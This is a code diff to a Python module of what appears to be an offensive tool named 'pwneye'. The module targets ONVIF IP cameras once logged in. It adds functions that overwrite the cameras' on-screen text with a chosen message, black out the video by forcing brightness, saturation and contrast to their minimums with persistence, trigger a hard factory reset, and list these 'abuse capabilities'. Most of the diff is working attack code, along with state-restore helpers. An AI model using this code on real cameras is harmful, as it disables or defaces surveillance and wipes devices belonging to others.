@@ -3,11 +3,14 @@ import queue
 import ssl
 import threading
 import time
-
+import traceback
 from itertools import product
+from types import SimpleNamespace
 from typing import Optional, List, Dict, Any, Callable
 
 from onvif import ONVIFClient, ONVIFDiscovery
+from onvif.cli.interactive import InteractiveShell
+from onvif.cli.utils import colorize
 from pwneye.core.network import common as netcomm
 
 # TODO: Expand ONVIF capabilities (e.g. device reboot)
@@ -31,6 +34,33 @@ ONVIF_PROBE_ENVELOPE = """<?xml version="1.0" encoding="UTF-8"?>
 # ----------------------------------------------------------------------
 # Low-level probe
 # ----------------------------------------------------------------------
+
+
+class PwneyeInteractiveShell(InteractiveShell):
+    """
+    Small wrapper around onvif-python's interactive shell with a quieter exit.
+    """
+
+    def do_quit(self, line):
+        self._stop_health_check.set()
+        return True
+
+    def do_exit(self, line):
+        return self.do_quit(line)
+
+    def run(self):
+        try:
+            self.cmdloop()
+        except KeyboardInterrupt:
+            self._stop_health_check.set()
+            raise
+
+
+def _emphasize_shell_text(text: str) -> str:
+    """
+    Return a bold ANSI-styled text fragment for the interactive shell intro.
+    """
+    return f"\033[1m{text}\033[0m"
 
 def probe_onvif_service(
     host: str,
@@ -536,6 +566,1023 @@ def get_profiles(client: ONVIFClient) -> List[Dict[str, str]]:
     return profiles_out
 
 
+def _extract_osd_configuration_tokens(profile: Any) -> list[str]:
+    """
+    Collect likely OSD-related configuration tokens from a media profile.
+    """
+    tokens: list[str] = []
+
+    profile_token = getattr(profile, "token", None)
+    if profile_token:
+        tokens.append(str(profile_token))
+
+    video_source_cfg = getattr(profile, "VideoSourceConfiguration", None)
+    if video_source_cfg is not None:
+        cfg_token = getattr(video_source_cfg, "token", None)
+        if cfg_token:
+            tokens.append(str(cfg_token))
+
+        source_token = getattr(video_source_cfg, "SourceToken", None)
+        if source_token:
+            tokens.append(str(source_token))
+
+    seen: set[str] = set()
+    return [token for token in tokens if not (token in seen or seen.add(token))]
+
+
+def _media_service_candidates(client: ONVIFClient) -> list[Any]:
+    """
+    Return available ONVIF media service wrappers.
+    """
+    services: list[Any] = []
+
+    for getter_name in ("media", "media2"):
+        getter = getattr(client, getter_name, None)
+        if getter is None:
+            continue
+
+        try:
+            service = getter()
+        except Exception:
+            continue
+
+        if service is not None:
+            services.append(service)
+
+    return services
+
+
+def _iter_osd_entries(client: ONVIFClient) -> list[tuple[Any, Any]]:
+    """
+    Return raw OSD entries paired with the service that exposed them.
+    """
+    entries: list[tuple[Any, Any]] = []
+    seen_tokens: set[str] = set()
+
+    def add_osd(service: Any, osd: Any) -> None:
+        token = str(getattr(osd, "token", None) or getattr(osd, "Token", None) or "")
+        if token and token in seen_tokens:
+            return
+
+        if token:
+            seen_tokens.add(token)
+        entries.append((service, osd))
+
+    for service in _media_service_candidates(client):
+        try:
+            osds = service.GetOSDs()
+        except Exception:
+            osds = []
+
+        for osd in osds or []:
+            add_osd(service, osd)
+
+        if entries:
+            continue
+
+        try:
+            profiles = service.GetProfiles()
+        except Exception:
+            profiles = []
+
+        for profile in profiles or []:
+            for token in _extract_osd_configuration_tokens(profile):
+                try:
+                    osds = service.GetOSDs(ConfigurationToken=token)
+                except Exception:
+                    continue
+
+                for osd in osds or []:
+                    add_osd(service, osd)
+
+    return entries
+
+
+def _serialize_osd_color(color: Any) -> dict[str, Any] | None:
+    """
+    Convert an ONVIF OSD color object into a SetOSD-safe dictionary.
+    """
+    if color is None:
+        return None
+
+    color_value = getattr(color, "Color", None)
+    if color_value is None:
+        return None
+
+    payload: dict[str, Any] = {}
+
+    transparent = getattr(color, "Transparent", None)
+    if transparent is not None:
+        payload["Transparent"] = transparent
+
+    payload["Color"] = {
+        key: value
+        for key, value in {
+            "X": getattr(color_value, "X", None),
+            "Y": getattr(color_value, "Y", None),
+            "Z": getattr(color_value, "Z", None),
+            "Colorspace": getattr(color_value, "Colorspace", None),
+        }.items()
+        if value is not None
+    }
+
+    if not payload["Color"]:
+        return None
+
+    return payload
+
+
+def _serialize_osd_position(position: Any) -> dict[str, Any] | None:
+    """
+    Convert an ONVIF OSD position object into a SetOSD-safe dictionary.
+    """
+    if position is None:
+        return None
+
+    payload: dict[str, Any] = {}
+
+    position_type = getattr(position, "Type", None) or getattr(position, "type", None)
+    if position_type is not None:
+        payload["Type"] = position_type
+
+    pos = getattr(position, "Pos", None)
+    if pos is not None:
+        coords = {
+            key: value
+            for key, value in {
+                "x": getattr(pos, "x", None),
+                "y": getattr(pos, "y", None),
+                "space": getattr(pos, "space", None),
+            }.items()
+            if value is not None
+        }
+        if coords:
+            payload["Pos"] = coords
+
+    return payload or None
+
+
+def _centered_osd_x_offset(message: str) -> float:
+    """
+    Estimate a leftward X offset so the rendered text appears more centered.
+
+    ONVIF does not expose the final rendered text width, so this is an
+    intentionally conservative heuristic based on message length.
+    """
+    normalized = " ".join(message.split())
+    length = len(normalized) if normalized else len(message)
+
+    # Best-effort estimate for a typical OSD glyph width in ONVIF normalized
+    # coordinates. Clamp so longer strings still remain on-screen.
+    estimated_half_width = min(0.72, max(0.0, length * 0.016))
+    return -estimated_half_width
+
+
+def _serialize_osd_reference(value: Any) -> dict[str, Any] | str | None:
+    """
+    Convert an ONVIF OSDReference-like object into a SetOSD-safe value.
+    """
+    if value is None:
+        return None
+
+    simple_value = getattr(value, "_value_1", None)
+    if simple_value not in (None, ""):
+        return {"_value_1": str(simple_value)}
+
+    if isinstance(value, str):
+        return value
+
+    text_value = str(value).strip()
+    if text_value:
+        return text_value
+
+    return None
+
+
+def _extract_osd_entry_token(osd: Any) -> str:
+    """
+    Return the token associated with an OSD entry, if any.
+    """
+    return str(getattr(osd, "token", None) or getattr(osd, "Token", None) or "")
+
+
+def _extract_osd_text_type(osd: Any) -> str:
+    """
+    Return the OSD text type, if any.
+    """
+    text_string = getattr(osd, "TextString", None)
+    if text_string is None:
+        return ""
+
+    return str(getattr(text_string, "Type", None) or "")
+
+
+def _extract_osd_plain_text(osd: Any) -> str:
+    """
+    Return the OSD plain text, if any.
+    """
+    text_string = getattr(osd, "TextString", None)
+    if text_string is None:
+        return ""
+
+    return str(getattr(text_string, "PlainText", None) or "")
+
+
+def _find_osd_entry_by_token(
+    client: ONVIFClient,
+    token: str,
+) -> Any | None:
+    """
+    Search all visible OSD entries and return the one matching the requested token.
+    """
+    if not token:
+        return None
+
+    for _, osd in _iter_osd_entries(client):
+        if _extract_osd_entry_token(osd) == token:
+            return osd
+
+    return None
+
+
+def _build_defaced_osd_payload(osd: Any, message: str) -> dict[str, Any]:
+    """
+    Build a minimal standards-compliant SetOSD payload.
+
+    This intentionally excludes vendor-specific extension fields gathered from
+    GetOSDs, because round-tripping those flattened values back into SetOSD is
+    not reliable across devices and Zeep type bindings.
+    """
+    token = str(getattr(osd, "token", None) or getattr(osd, "Token", None) or "")
+    video_source_token = _serialize_osd_reference(
+        getattr(osd, "VideoSourceConfigurationToken", None)
+    )
+    existing_text = getattr(osd, "TextString", None)
+
+    payload: dict[str, Any] = {
+        "token": token,
+        "Type": "Text",
+        "Position": {
+            "Type": "Custom",
+            "Pos": {
+                "x": _centered_osd_x_offset(message),
+                "y": 0.0,
+            },
+        },
+        "TextString": {
+            "Type": "Plain",
+            "PlainText": message,
+        },
+    }
+
+    if video_source_token is not None:
+        payload["VideoSourceConfigurationToken"] = video_source_token
+
+    if existing_text is not None:
+        font_size = getattr(existing_text, "FontSize", None)
+        if font_size is not None:
+            payload["TextString"]["FontSize"] = font_size
+
+        font_color = _serialize_osd_color(getattr(existing_text, "FontColor", None))
+        if font_color is not None:
+            payload["TextString"]["FontColor"] = font_color
+
+        background_color = _serialize_osd_color(getattr(existing_text, "BackgroundColor", None))
+        if background_color is not None:
+            payload["TextString"]["BackgroundColor"] = background_color
+
+    if existing_text is not None:
+        persistent = getattr(existing_text, "IsPersistentText", None)
+        if persistent is not None:
+            payload["TextString"]["IsPersistentText"] = persistent
+
+    return payload
+
+
+def _serialize_text_string(text_string: Any) -> dict[str, Any]:
+    """
+    Convert an ONVIF text string object into a SetOSD-safe dictionary.
+    """
+    if text_string is None:
+        return {}
+
+    payload: dict[str, Any] = {}
+
+    text_type = getattr(text_string, "Type", None)
+    if text_type is not None:
+        payload["Type"] = str(text_type)
+
+    plain_text = getattr(text_string, "PlainText", None)
+    if plain_text is not None:
+        payload["PlainText"] = str(plain_text)
+
+    font_size = getattr(text_string, "FontSize", None)
+    if font_size is not None:
+        payload["FontSize"] = font_size
+
+    font_color = _serialize_osd_color(getattr(text_string, "FontColor", None))
+    if font_color is not None:
+        payload["FontColor"] = font_color
+
+    background_color = _serialize_osd_color(getattr(text_string, "BackgroundColor", None))
+    if background_color is not None:
+        payload["BackgroundColor"] = background_color
+
+    persistent = getattr(text_string, "IsPersistentText", None)
+    if persistent is not None:
+        payload["IsPersistentText"] = persistent
+
+    return payload
+
+
+def _serialize_osd_restore_payload(osd: Any) -> dict[str, Any]:
+    """
+    Convert an existing OSD entry into a minimal restore payload.
+    """
+    token = _extract_osd_entry_token(osd)
+    payload: dict[str, Any] = {
+        "token": token,
+    }
+
+    osd_type = getattr(osd, "Type", None)
+    if osd_type is not None:
+        payload["Type"] = str(osd_type)
+
+    video_source_token = _serialize_osd_reference(
+        getattr(osd, "VideoSourceConfigurationToken", None)
+    )
+    if video_source_token is not None:
+        payload["VideoSourceConfigurationToken"] = video_source_token
+
+    position = _serialize_osd_position(getattr(osd, "Position", None))
+    if position is not None:
+        payload["Position"] = position
+
+    text_payload = _serialize_text_string(getattr(osd, "TextString", None))
+    if text_payload:
+        payload["TextString"] = text_payload
+
+    return payload
+
+
+def _restore_osd_payload_matches(expected: dict[str, Any], current: Any) -> bool:
+    """
+    Return True if the current OSD entry still matches the expected restore payload.
+    """
+    current_type = str(getattr(current, "Type", None) or "")
+    expected_type = str(expected.get("Type") or "")
+    if expected_type and current_type != expected_type:
+        return False
+
+    expected_text = expected.get("TextString") or {}
+    if expected_text:
+        current_text = getattr(current, "TextString", None)
+        current_text_type = str(getattr(current_text, "Type", None) or "")
+        expected_text_type = str(expected_text.get("Type") or "")
+        if expected_text_type and current_text_type != expected_text_type:
+            return False
+
+        expected_plain = str(expected_text.get("PlainText") or "")
+        current_plain = str(getattr(current_text, "PlainText", None) or "")
+        if current_plain != expected_plain:
+            return False
+
+    expected_position = expected.get("Position") or {}
+    if expected_position:
+        current_position = getattr(current, "Position", None)
+        current_position_type = str(
+            getattr(current_position, "Type", None) or getattr(current_position, "type", None) or ""
+        )
+        expected_position_type = str(expected_position.get("Type") or "")
+        if expected_position_type and current_position_type != expected_position_type:
+            return False
+
+        expected_pos = expected_position.get("Pos") or {}
+        if expected_pos:
+            current_pos = getattr(current_position, "Pos", None)
+            current_x = _coerce_numeric(getattr(current_pos, "x", None))
+            current_y = _coerce_numeric(getattr(current_pos, "y", None))
+            expected_x = _coerce_numeric(expected_pos.get("x"))
+            expected_y = _coerce_numeric(expected_pos.get("y"))
+
+            if expected_x is not None and (current_x is None or abs(float(current_x) - float(expected_x)) > 0.01):
+                return False
+            if expected_y is not None and (current_y is None or abs(float(current_y) - float(expected_y)) > 0.01):
+                return False
+
+    return True
+
+
+def _capture_osd_restore_payloads(client: ONVIFClient) -> list[dict[str, Any]]:
+    """
+    Capture restore payloads for writable Text/Plain OSD entries.
+    """
+    payloads: list[dict[str, Any]] = []
+
+    for _, osd in _iter_osd_entries(client):
+        osd_type = str(getattr(osd, "Type", None) or "")
+        text_type = _extract_osd_text_type(osd)
+        if osd_type != "Text" or text_type != "Plain":
+            continue
+
+        payload = _serialize_osd_restore_payload(osd)
+        if payload.get("token"):
+            payloads.append(payload)
+
+    return payloads
+
+
+def supports_osd(client: ONVIFClient) -> bool:
+    """
+    Best-effort check for ONVIF OSD management support using read-only probes.
+    """
+    for service in _media_service_candidates(client):
+        try:
+            profiles = service.GetProfiles()
+        except Exception:
+            profiles = []
+
+        try:
+            service.GetOSDs()
+            return True
+        except Exception:
+            pass
+
+        for profile in profiles or []:
+            for token in _extract_osd_configuration_tokens(profile):
+                try:
+                    service.GetOSDOptions(ConfigurationToken=token)
+                    return True
+                except Exception:
+                    pass
+
+                try:
+                    service.GetOSDs(ConfigurationToken=token)
+                    return True
+                except Exception:
+                    pass
+
+    return False
+
+
+def supports_osd_deface(client: ONVIFClient) -> bool:
+    """
+    Return True only if the device exposes at least one Text/Plain OSD entry.
+    """
+    for _, osd in _iter_osd_entries(client):
+        osd_type = str(getattr(osd, "Type", None) or "")
+        text_type = _extract_osd_text_type(osd)
+        if osd_type == "Text" and text_type == "Plain":
+            return True
+
+    return False
+
+
+def _imaging_service(client: ONVIFClient) -> Any | None:
+    """
+    Return the ONVIF imaging service wrapper when available.
+    """
+    getter = getattr(client, "imaging", None)
+    if getter is None:
+        return None
+
+    try:
+        return getter()
+    except Exception:
+        return None
+
+
+def _video_source_tokens(client: ONVIFClient) -> list[str]:
+    """
+    Collect likely video source tokens for ONVIF imaging operations.
+    """
+    tokens: list[str] = []
+    seen: set[str] = set()
+
+    def add_token(value: Any) -> None:
+        token = str(value).strip() if value is not None else ""
+        if not token or token in seen:
+            return
+
+        seen.add(token)
+        tokens.append(token)
+
+    for service in _media_service_candidates(client):
+        try:
+            profiles = service.GetProfiles()
+        except Exception:
+            profiles = []
+
+        for profile in profiles or []:
+            video_source_cfg = getattr(profile, "VideoSourceConfiguration", None)
+            if video_source_cfg is not None:
+                add_token(getattr(video_source_cfg, "SourceToken", None))
+
+    return tokens
+
+
+def _coerce_numeric(value: Any) -> float | int | None:
+    """
+    Convert ONVIF numeric values or wrappers to a comparable scalar.
+    """
+    if isinstance(value, (int, float)):
+        return value
+
+    for attr in ("_value_1", "Value", "value"):
+        nested = getattr(value, attr, None)
+        if isinstance(nested, (int, float)):
+            return nested
+        if isinstance(nested, str):
+            try:
+                numeric = float(nested)
+            except ValueError:
+                continue
+            return int(numeric) if numeric.is_integer() else numeric
+
+    if isinstance(value, str):
+        try:
+            numeric = float(value)
+        except ValueError:
+            return None
+        return int(numeric) if numeric.is_integer() else numeric
+
+    return None
+
+
+def _extract_option_min(options: Any, field_name: str) -> float | int | None:
+    """
+    Extract the minimum supported value for a numeric imaging setting.
+    """
+    option = getattr(options, field_name, None)
+    if option is None:
+        return None
+
+    minimum = getattr(option, "Min", None)
+    return _coerce_numeric(minimum)
+
+
+def _prepare_imaging_blackout(
+    settings: Any,
+    options: Any,
+) -> dict[str, float | int]:
+    """
+    Update imaging settings in place to darken the stream as much as possible.
+    """
+    applied_fields: dict[str, float | int] = {}
+
+    for field_name in ("Brightness", "ColorSaturation", "Contrast"):
+        minimum = _extract_option_min(options, field_name)
+        if minimum is None:
+            continue
+
+        setattr(settings, field_name, minimum)
+        applied_fields[field_name] = minimum
+
+    return applied_fields
+
+
+def get_imaging_deface_support(client: ONVIFClient) -> Dict[str, Any]:
+    """
+    Return whether the target appears to support stream darkening through ONVIF imaging.
+    """
+    service = _imaging_service(client)
+    if service is None:
+        return {
+            "ok": False,
+            "error": "No ONVIF imaging service was exposed",
+        }
+
+    tokens = _video_source_tokens(client)
+    if not tokens:
+        return {
+            "ok": False,
+            "error": "No usable video source token was found",
+        }
+
+    last_reason = None
+    last_traceback = None
+
+    for token in tokens:
+        try:
+            settings = service.GetImagingSettings(VideoSourceToken=token)
+            options = service.GetOptions(VideoSourceToken=token)
+        except Exception:
+            last_reason = "The device rejected ONVIF imaging capability queries"
+            last_traceback = traceback.format_exc().rstrip()
+            continue
+
+        if _prepare_imaging_blackout(settings, options):
+            return {
+                "ok": True,
+                "token": token,
+            }
+
+        last_reason = (
+            "The device exposes ONVIF imaging, but no suitable darkening controls were found"
+        )
+
+    return {
+        "ok": False,
+        "error": last_reason or "Stream darkening is not available on this target",
+        "traceback": last_traceback,
+    }
+
+
+def get_deface_support(client: ONVIFClient) -> Dict[str, Any]:
+    """
+    Return the overall ONVIF deface support state.
+    """
+    imaging = get_imaging_deface_support(client)
+    text = supports_osd_deface(client)
+    imaging_ok = bool(imaging.get("ok"))
+
+    status = "No"
+    if imaging_ok and text:
+        status = "Yes"
+    elif imaging_ok or text:
+        status = "Partial"
+
+    return {
+        "status": status,
+        "darkening": imaging_ok,
+        "text": text,
+        "imaging_error": imaging.get("error"),
+        "imaging_traceback": imaging.get("traceback"),
+    }
+
+
+def build_deface_restore_profile(
+    client: ONVIFClient,
+    message: str,
+) -> dict[str, Any]:
+    """
+    Capture the ONVIF state needed to restore a previous deface attempt.
+    """
+    profile: dict[str, Any] = {
+        "message": message,
+        "saved_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+        "profiles": get_profiles(client),
+        "text_layers": _capture_osd_restore_payloads(client),
+    }
+
+    imaging_support = get_imaging_deface_support(client)
+    if imaging_support.get("ok"):
+        token = str(imaging_support.get("token") or "")
+        service = _imaging_service(client)
+        if service is not None and token:
+            try:
+                settings = service.GetImagingSettings(VideoSourceToken=token)
+                options = service.GetOptions(VideoSourceToken=token)
+            except Exception:
+                settings = None
+                options = None
+
+            if settings is not None and options is not None:
+                imaging_fields = {}
+                for field_name in ("Brightness", "ColorSaturation", "Contrast"):
+                    minimum = _extract_option_min(options, field_name)
+                    if minimum is None:
+                        continue
+
+                    current_value = _coerce_numeric(getattr(settings, field_name, None))
+                    if current_value is None:
+                        continue
+
+                    imaging_fields[field_name] = current_value
+
+                if imaging_fields:
+                    profile["imaging"] = {
+                        "token": token,
+                        "settings": imaging_fields,
+                    }
+
+    return profile
+
+
+def supports_factory_reset(client: ONVIFClient) -> bool:
+    """
+    Best-effort check for factory reset method availability without invoking it.
+    """
+    try:
+        device = client.devicemgmt()
+        device.GetServiceCapabilities()
+    except Exception:
+        return False
+
+    try:
+        return callable(getattr(device.operator.service, "SetSystemFactoryDefault"))
+    except Exception:
+        return False
+
+
+def deface_osd_entries(
+    client: ONVIFClient,
+    message: str,
+) -> List[Dict[str, str]]:
+    """
+    Overwrite only existing ONVIF Text/Plain OSD entries.
+
+    Returns one result dictionary per OSD entry that was attempted.
+    """
+    results: List[Dict[str, str]] = []
+
+    for service, osd in _iter_osd_entries(client):
+        token = _extract_osd_entry_token(osd)
+        osd_type = str(getattr(osd, "Type", None) or "")
+        text_type = _extract_osd_text_type(osd)
+
+        if osd_type != "Text" or text_type != "Plain":
+            continue
+
+        try:
+            payload = _build_defaced_osd_payload(osd, message)
+            service.SetOSD(OSD=payload)
+
+            results.append({
+                "token": token or "(empty)",
+                "status": "updated",
+            })
+        except Exception:
+            results.append({
+                "token": token or "(empty)",
+                "status": "failed",
+                "error": "The device rejected the ONVIF OSD update request",
+            })
+
+    return results
+
+
+def apply_imaging_blackout(
+    client: ONVIFClient,
+) -> Dict[str, Any]:
+    """
+    Try darkening the stream through ONVIF imaging settings.
+    """
+    service = _imaging_service(client)
+    if service is None:
+        return {
+            "ok": False,
+            "error": "No ONVIF imaging service was exposed",
+        }
+
+    last_reason = None
+    last_traceback = None
+
+    for token in _video_source_tokens(client):
+        try:
+            settings = service.GetImagingSettings(VideoSourceToken=token)
+            options = service.GetOptions(VideoSourceToken=token)
+        except Exception:
+            last_reason = "The device rejected ONVIF imaging capability queries"
+            last_traceback = traceback.format_exc().rstrip()
+            continue
+
+        applied_fields = _prepare_imaging_blackout(settings, options)
+        if not applied_fields:
+            last_reason = "No suitable darkening controls were found for this stream"
+            continue
+
+        try:
+            try:
+                service.SetImagingSettings(
+                    VideoSourceToken=token,
+                    ImagingSettings=settings,
+                    ForcePersistence=True,
+                )
+            except Exception:
+                service.SetImagingSettings(
+                    VideoSourceToken=token,
+                    ImagingSettings=settings,
+                )
+
+            return {
+                "ok": True,
+                "token": token,
+                "applied_fields": applied_fields,
+            }
+        except Exception:
+            last_reason = "The device rejected the ONVIF imaging update request"
+            last_traceback = traceback.format_exc().rstrip()
+            continue
+
+    return {
+        "ok": False,
+        "error": last_reason or "The device rejected the ONVIF imaging update request",
+        "traceback": last_traceback,
+    }
+
+
+def verify_imaging_blackout(
+    client: ONVIFClient,
+    token: str,
+    expected_fields: dict[str, float | int],
+) -> bool:
+    """
+    Verify that the requested imaging settings are still visible through ONVIF.
+    """
+    if not token or not expected_fields:
+        return False
+
+    service = _imaging_service(client)
+    if service is None:
+        return False
+
+    for _ in range(3):
+        try:
+            settings = service.GetImagingSettings(VideoSourceToken=token)
+        except Exception:
+            settings = None
+
+        if settings is not None:
+            matched = True
+            for field_name, expected_value in expected_fields.items():
+                actual_value = _coerce_numeric(getattr(settings, field_name, None))
+                if actual_value is None:
+                    matched = False
+                    break
+
+                if abs(float(actual_value) - float(expected_value)) > 0.01:
+                    matched = False
+                    break
+
+            if matched:
+                return True
+
+        time.sleep(0.35)
+
+    return False
+
+
+def restore_imaging_profile(
+    client: ONVIFClient,
+    profile: dict[str, Any],
+) -> bool:
+    """
+    Restore previously saved imaging settings.
+    """
+    token = str(profile.get("token") or "")
+    expected_fields = profile.get("settings") or {}
+    if not token or not expected_fields:
+        return False
+
+    service = _imaging_service(client)
+    if service is None:
+        return False
+
+    try:
+        settings = service.GetImagingSettings(VideoSourceToken=token)
+    except Exception:
+        return False
+
+    for field_name, expected_value in expected_fields.items():
+        setattr(settings, field_name, expected_value)
+
+    try:
+        try:
+            service.SetImagingSettings(
+                VideoSourceToken=token,
+                ImagingSettings=settings,
+                ForcePersistence=True,
+            )
+        except Exception:
+            service.SetImagingSettings(
+                VideoSourceToken=token,
+                ImagingSettings=settings,
+            )
+    except Exception:
+        return False
+
+    return verify_imaging_blackout(client, token, expected_fields)
+
+
+def verify_defaced_osd_entries(
+    client: ONVIFClient,
+    tokens: list[str],
+    message: str,
+) -> List[Dict[str, str]]:
+    """
+    Verify that updated ONVIF OSD entries still expose Text/Plain with the requested message.
+    """
+    results: List[Dict[str, str]] = []
+
+    for token in [token for token in tokens if token]:
+        refreshed = None
+
+        for _ in range(3):
+            refreshed = _find_osd_entry_by_token(client, token)
+            if refreshed is not None:
+                break
+            time.sleep(0.35)
+
+        if refreshed is None:
+            results.append({
+                "token": token,
+                "status": "unconfirmed",
+            })
+            continue
+
+        refreshed_type = _extract_osd_text_type(refreshed)
+        refreshed_text = _extract_osd_plain_text(refreshed)
+
+        if refreshed_type == "Plain" and refreshed_text == message:
+            results.append({
+                "token": token,
+                "status": "verified",
+            })
+        elif (
+            refreshed_type == "Plain"
+            and refreshed_text
+            and message.startswith(refreshed_text)
+        ):
+            results.append({
+                "token": token,
+                "status": "truncated",
+                "visible_text": refreshed_text,
+            })
+        else:
+            results.append({
+                "token": token,
+                "status": "failed",
+            })
+
+    return results
+
+
+def restore_osd_entries(
+    client: ONVIFClient,
+    payloads: list[dict[str, Any]],
+) -> List[Dict[str, str]]:
+    """
+    Restore previously saved OSD entries from serialized SetOSD payloads.
+    """
+    results: List[Dict[str, str]] = []
+    if not payloads:
+        return results
+
+    services = _media_service_candidates(client)
+    if not services:
+        return results
+
+    for payload in payloads:
+        token = str(payload.get("token") or "")
+        if not token:
+            continue
+
+        updated = False
+        for service in services:
+            try:
+                service.SetOSD(OSD=payload)
+                updated = True
+                break
+            except Exception:
+                continue
+
+        if not updated:
+            results.append({
+                "token": token,
+                "status": "failed",
+            })
+            continue
+
+        refreshed = None
+        for _ in range(3):
+            refreshed = _find_osd_entry_by_token(client, token)
+            if refreshed is not None:
+                break
+            time.sleep(0.35)
+
+        if refreshed is None:
+            results.append({
+                "token": token,
+                "status": "unconfirmed",
+            })
+            continue
+
+        if _restore_osd_payload_matches(payload, refreshed):
+            results.append({
+                "token": token,
+                "status": "restored",
+            })
+        else:
+            results.append({
+                "token": token,
+                "status": "failed",
+            })
+
+    return results
+
+
+def get_abuse_capabilities(client: ONVIFClient) -> Dict[str, str]:
+    """
+    Return useful post-auth ONVIF capabilities in a printable form.
+    """
+    deface_support = get_deface_support(client)
+    return {
+        "Supports ONVIF Deface": str(deface_support["status"]),
+        "Factory Reset Method Available": "Yes" if supports_factory_reset(client) else "No",
+    }
+
+
 def get_rtsp_streams(client: ONVIFClient) -> List[str]:
     """
     Extract RTSP stream URIs via ONVIF Media service.
@@ -662,3 +1709,59 @@ def system_reboot(client: ONVIFClient) -> bool:
         return True
     except Exception:
         return False
+
+
+def system_factory_reset(
+    client: ONVIFClient,
+    mode: str = "Hard",
+) -> bool:
+    """
+    Request a factory reset via the ONVIF Device service.
+
+    Returns:
+        True if the reset request was accepted, False otherwise.
+    """
+    try:
+        device = client.devicemgmt()
+        device.SetSystemFactoryDefault(mode)
+        return True
+    except Exception:
+        return False
+
+
+def open_interactive_shell(
+    client: ONVIFClient,
+    *,
+    host: str,
+    port: int,
+    username: str,
+    password: str,
+) -> bool:
+    """
+    Launch the interactive onvif-python shell for the given target.
+    """
+    shell_args = SimpleNamespace(
+        host=host,
+        port=port,
+        username=username,
+        password=password,
+        https=False,
+        no_verify_ssl=False,
+        timeout=10,
+        debug=False,
+        no_patch=False,
+        wsdl=None,
+        cache="all",
+        health_check_interval=10,
+    )
+
+    shell = PwneyeInteractiveShell(client, shell_args)
+    shell.intro = (
+        "\n"
+        f"This feature is powered by "
+        f"{colorize('https://github.com/nirsimetri/onvif-python', 'white')} "
+        f"({colorize('leave it a ⭐!', 'yellow')})\n"
+        f"Use {_emphasize_shell_text('TAB')} for completion and {_emphasize_shell_text('help')} for commands.\n"
+    )
+    shell.run()
+    return True
